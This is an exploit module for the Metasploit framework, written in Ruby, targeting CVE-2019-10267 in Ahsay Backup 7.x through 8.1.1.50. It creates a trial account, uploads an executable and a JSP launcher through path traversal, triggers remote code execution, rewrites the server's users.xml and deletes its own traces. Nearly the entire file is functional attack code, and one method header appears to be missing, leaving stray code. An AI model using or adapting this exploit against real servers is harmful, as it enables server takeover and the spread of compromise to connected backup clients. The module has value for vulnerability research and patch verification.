# Date: 26-6-2019
# Exploit Author: Wietse Boonstra
# Vendor Homepage: https://ahsay.com
# Software Link: http://ahsay-dn.ahsay.com/v8/81150/cbs-win.exe
# Version: 7.x < 8.1.1.50 (REQUIRED)
# Tested on: Windows / Linux
# CVE : CVE-2019-10267
 
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include REXML
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Ahsay Backup v7.x-v8.1.1.50 (authenticated) file upload&#039;,
      &#039;Description&#039; => %q{
       This module exploits an authenticated insecure file upload and code
       execution flaw in Ahsay Backup v7.x - v8.1.1.50. To succesfully execute
       the upload credentials are needed, default on Ahsay Backup trial
       accounts are enabled so an account can be created.
 
       It can be exploited in Windows and Linux environments to get remote code
       execution (usualy as SYSTEM). This module has been tested successfully
       on Ahsay Backup v8.1.1.50 with Windows 2003 SP2 Server. Because of this
       flaw all connected clients can be configured to execute a command before
       the backup starts. Allowing an attacker to takeover even more systems
       and make it rain shells!
 
       Setting the CREATEACCOUNT to true will create a new account, this is
       enabled by default.
       If credeantials are known enter these and run the exploit.
      },
      &#039;Author&#039;       =>
        [
          &#039;Wietse Boonstra&#039;
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2019-10267&#039;],
          [ &#039;URL&#039;, &#039;https://www.wbsec.nl/ahsay/&#039; ],
          [ &#039;URL&#039;, &#039;http://ahsay-dn.ahsay.com/v8/81150/cbs-win.exe&#039; ]
        ],
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;DefaultOptions&#039; => {
        &#039;RPORT&#039; => 443,
        &#039;SSL&#039; => true,
      },
      &#039;Targets&#039;     =>
        [
          [  &#039;Windows x86&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [ &#039;Linux x86&#039;, # should work but untested
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            },
          ],
 
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 1 2019&#039;))
 
    register_options(
      [
        Opt::RPORT(443),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to Ahsay&#039;, &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;Username for the (new) account&#039;, Rex::Text.rand_text_alphanumeric(8)]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password for the (new) account&#039;, Rex::Text.rand_text_alpha(8) + Rex::Text.rand_text_numeric(5) + Rex::Text.rand_char("","!$%^&*")]),
        OptString.new(&#039;CREATEACCOUNT&#039;, [false, &#039;Create Trial account&#039;, &#039;false&#039;]),
        OptString.new(&#039;UPLOADPATH&#039;, [false, &#039;Payload Path&#039;, &#039;../../webapps/cbs/help/en&#039;]),
 
      ])
  end
 
  def is_trial_enabled?
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;obs&#039;,&#039;obm7&#039;,&#039;user&#039;,&#039;isTrialEnabled&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039;   => &#039;&#039;
    })
    if res and res.code == 200 and "ENABLED" =~ /#{res.body}/
      return true
    else
      return false
    end
  end
 
  def check_account?
    headers = create_request_headers
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;obs&#039;,&#039;obm7&#039;,&#039;user&#039;,&#039;getUserProfile&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039;   => &#039;&#039;,
      &#039;headers&#039; => headers
    })
    if res and res.code == 200
      print_good("Username and password are valid!")
      return true
    elsif res and res.code == 500 and "USER_NOT_EXIST" =~ /#{res.body}/
      # fail_with(Failure::NoAccess, &#039;Username incorrect!&#039;)
      print_status("Username does not exist.")
      return false
    elsif res and res.code == 500 and "PASSWORD_INCORRECT" =~ /#{res.body}/
      # fail_with(Failure::NoAccess, &#039;Username exists but password incorrect!&#039;)
      print_status("Username exists but password incorrect!")
      return false
    else
      return false
    end
  end
 
  def create_request_headers
    headers = {}
    username = Rex::Text.encode_base64(datastore[&#039;USERNAME&#039;])
    password = Rex::Text.encode_base64(datastore[&#039;PASSWORD&#039;])
    headers[&#039;X-RSW-custom-encode-username&#039;] = username
    headers[&#039;X-RSW-custom-encode-password&#039;] = password
    headers
  end
 
  def exploit
    username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]
 
    if is_trial_enabled? and datastore[&#039;CREATEACCOUNT&#039;] == "true"
      if username == "" or password == ""
        fail_with(Failure::NoAccess, &#039;Please set a username and password&#039;)
      else
        #check if account does not exists?
        if !check_account?
          # Create account and check if it is valid
          if create_account?
            drop_and_execute()
          else
            fail_with(Failure::NoAccess, &#039;Failed to authenticate&#039;)
          end
        else
          #Need to fix, check if account exist
          print_good("No need to create account, already exists!")
          drop_and_execute()
        end
      end
    elsif username != "" and password != ""
      if check_account?
        drop_and_execute()
      else
        if is_trial_enabled?
          fail_with(Failure::NoAccess, &#039;Username and password are invalid. But server supports trial accounts, you can create an account!&#039;)
        end
        fail_with(Failure::NoAccess, &#039;Username and password are invalid&#039;)
      end
    else
      fail_with(Failure::UnexpectedReply, &#039;Missing some settings&#039;)
    end
  end
 
  def create_account?
    headers = create_request_headers
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;obs&#039;,&#039;obm7&#039;,&#039;user&#039;,&#039;addTrialUser&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039;   => &#039;&#039;,
      &#039;headers&#039; => headers
    })
    # print (res.body)
    if res and res.code == 200
      print_good("Account created")
      return true
    elsif res.body.include?(&#039;LOGIN_NAME_IS_USED&#039;)
      fail_with(Failure::NoAccess, &#039;Username is in use!&#039;)
    elsif res.body.include?(&#039;PWD_COMPLEXITY_FAILURE&#039;)
      fail_with(Failure::NoAccess, &#039;Password not complex enough&#039;)
    else
      fail_with(Failure::UnexpectedReply, &#039;Something went wrong!&#039;)
    end
  end
 
  def remove_account
    if datastore[&#039;CREATEACCOUNT&#039;]
      username = datastore[&#039;USERNAME&#039;]
      users_xml = "../../conf/users.xml"
      print_status("Looking for account #{username} in #{users_xml}")
      xml_doc = download(users_xml)
      xmldoc = Document.new(xml_doc)
      el = 0
      xmldoc.elements.each("Setting/Key") do |e|
          el = el + 1
          e.elements.each("Value") do |a|
              if a.attributes["name"].include?(&#039;name&#039;)
                  if a.attributes["data"].include?(username)
                      print_good("Found account")
                      xmldoc.root.elements.delete el
                      print_status("Removed account")
                  end
              end
          end
      end
      new_xml = xmldoc.root
      print_status("Uploading new #{users_xml} file")
      upload(users_xml, new_xml.to_s)
      print_good("Account is inaccesible when service restarts!")
    end
  end
 
    if path.end_with? &#039;/&#039;
      path = path.chomp(&#039;/&#039;)
    end
    path
  end
 
  def drop_and_execute()
    exploitpath = path.gsub("../../webapps/cbs/",&#039;&#039;)
    exploitpath = exploitpath.gsub("/","\\\\\\")
    requestpath = path.gsub("../../webapps/",&#039;&#039;)
 
    #First stage payload creation and upload
    exe = payload.encoded_exe
    exe_filename = Rex::Text.rand_text_alpha(10)
    exefileLocation = "#{path}/#{exe_filename}.exe"
    print_status("Uploading first stage payload.")
    upload(exefileLocation, exe)
    #../../webapps/cbs/help/en
    exec = %Q{<% Runtime.getRuntime().exec(getServletContext().getRealPath("/") + "#{exploitpath}\\\\#{exe_filename}.exe");%>}
 
    #Second stage payload creation and upload
    jsp_filename = Rex::Text.rand_text_alpha(10)
    jspfileLocation = "#{path}/#{jsp_filename}.jsp"
    print_status("Uploading second stage payload.")
    upload(jspfileLocation, exec)
    proto = ssl ? &#039;https&#039; : &#039;http&#039;
    url = "#{proto}://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}" + normalize_uri(target_uri.path, "#{requestpath}/#{jsp_filename}.jsp")
 
    #Triggering the exploit
    print_status("Triggering exploit! #{url}" )
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "#{requestpath}/#{jsp_filename}.jsp"),
      &#039;method&#039; => &#039;GET&#039;
    })
    if res and res.code == 200
      print_good("Exploit executed!")
    end
 
    #Cleaning up
    print_status("Cleaning up after our selfs.")
    remove_account
    print_status("Trying to remove #{exefileLocation}, but will fail when in use.")
    delete(exefileLocation)
    delete(jspfileLocation)
    delete("../../user/#{datastore[&#039;USERNAME&#039;]}",true)
  end
 
  def upload(fileLocation, content)
    username = Rex::Text.encode_base64(datastore[&#039;USERNAME&#039;])
    password = Rex::Text.encode_base64(datastore[&#039;PASSWORD&#039;])
    uploadPath = Rex::Text.encode_base64(fileLocation)
 
    headers = {}
    headers[&#039;X-RSW-Request-0&#039;] = username
    headers[&#039;X-RSW-Request-1&#039;] = password
    headers[&#039;X-RSW-custom-encode-path&#039;] = uploadPath
    res = send_request_raw({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;obs&#039;,&#039;obm7&#039;,&#039;file&#039;,&#039;upload&#039;),
      &#039;method&#039; => &#039;PUT&#039;,
      &#039;headers&#039; => headers,
      &#039;data&#039; => content,
      &#039;timeout&#039; => 20
    })
    if res && res.code == 201
      print_good("Succesfully uploaded file to #{fileLocation}")
    else
      fail_with(Failure::Unknown, "#{peer} - Server did not respond in an expected way")
    end
  end
 
  def download(fileLocation)
    #TODO make vars_get variable
    print_status("Downloading file")
    username = Rex::Text.encode_base64(datastore[&#039;USERNAME&#039;])
    password = Rex::Text.encode_base64(datastore[&#039;PASSWORD&#039;])
    headers = {}
    headers[&#039;X-RSW-Request-0&#039;] = username
    headers[&#039;X-RSW-Request-1&#039;] = password
    res = send_request_cgi({
      #/obs/obm7/file/download?X-RSW-custom-encode-path=../../conf/users.xml
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;obs&#039;,&#039;obm7&#039;,&#039;file&#039;,&#039;download&#039;),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;headers&#039; => headers,
      &#039;vars_get&#039; => {
        &#039;X-RSW-custom-encode-path&#039; => fileLocation
      }
    })
 
    if res and res.code == 200
      res.body
    end
  end
 
  def delete(fileLocation, recursive=false)
    print_status("Deleting file #{fileLocation}")
    username = Rex::Text.encode_base64(datastore[&#039;USERNAME&#039;])
    password = Rex::Text.encode_base64(datastore[&#039;PASSWORD&#039;])
    headers = {}
    headers[&#039;X-RSW-Request-0&#039;] = username
    headers[&#039;X-RSW-Request-1&#039;] = password
    res = send_request_cgi({
      #/obs/obm7/file/delete?X-RSW-custom-encode-path=../../user/xyz
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;obs&#039;,&#039;obm7&#039;,&#039;file&#039;,&#039;delete&#039;),
      &#039;method&#039; => &#039;DELETE&#039;,
      &#039;headers&#039; => headers,
      &#039;vars_get&#039; => {
        &#039;X-RSW-custom-encode-path&#039; => fileLocation,
        &#039;recursive&#039; => recursive
      }
    })
 
    if res and res.code == 200
      res.body
    end
  end
 
  def check
    #We need a cookie first
    cookie_res = send_request_cgi({
      #/cbs/system/ShowDownload.do
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;cbs&#039;,&#039;system&#039;,&#039;ShowDownload.do&#039;),
      &#039;method&#039; => &#039;GET&#039;
    })
 
    if cookie_res and cookie_res.code == 200
      cookie = cookie_res.get_cookies.split()[0]
    else
      return Exploit::CheckCode::Unknown
    end
 
    if defined?(cookie)
      #request the page with all the clientside software links.
      headers = {}
      headers[&#039;Cookie&#039;] = cookie
      link = send_request_cgi({
        #/cbs/system/ShowDownload.do
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;cbs&#039;,&#039;system&#039;,&#039;download&#039;,&#039;indexTab1.jsp&#039;),
        &#039;method&#039; => &#039;GET&#039;,
        &#039;headers&#039; => headers
      })
 
      if link and link.code == 200
        link.body.each_line do |line|
          #looking for the link that contains obm-linux and ends with .sh
          if line.include? &#039;<a href="/cbs/download/&#039; and line.include? &#039;.sh&#039; and line.include? &#039;obm-linux&#039;
            filename = line.split("<a")[1].split(&#039;"&#039;)[1].split("?")[0]
            filecontent = send_request_cgi({
              #/cbs/system/ShowDownload.do
              &#039;uri&#039; => normalize_uri(target_uri.path, filename),
              &#039;method&#039; => &#039;GET&#039;,
              &#039;headers&#039; => headers
            })
            if filecontent and filecontent.code == 200
              filecontent.body.each_line do |l|
                if l.include? &#039;VERSION="&#039;
                  number = l.split("=")[1].split(&#039;"&#039;)[1]
                  if number.match /(\d+\.)?(\d+\.)?(\d+\.)?(\*|\d+)$/
                    if number <= &#039;8.1.1.50&#039; and not number < &#039;7&#039;
                      return Exploit::CheckCode::Appears
                    else
                      return Exploit::CheckCode::Safe
                    end
                  end
                end
              end
            else
              return Exploit::CheckCode::Unknown
            end
          end
        end
      else
        return Exploit::CheckCode::Unknown
      end
    else
      return Exploit::CheckCode::Unknown
    end
 
  end
end

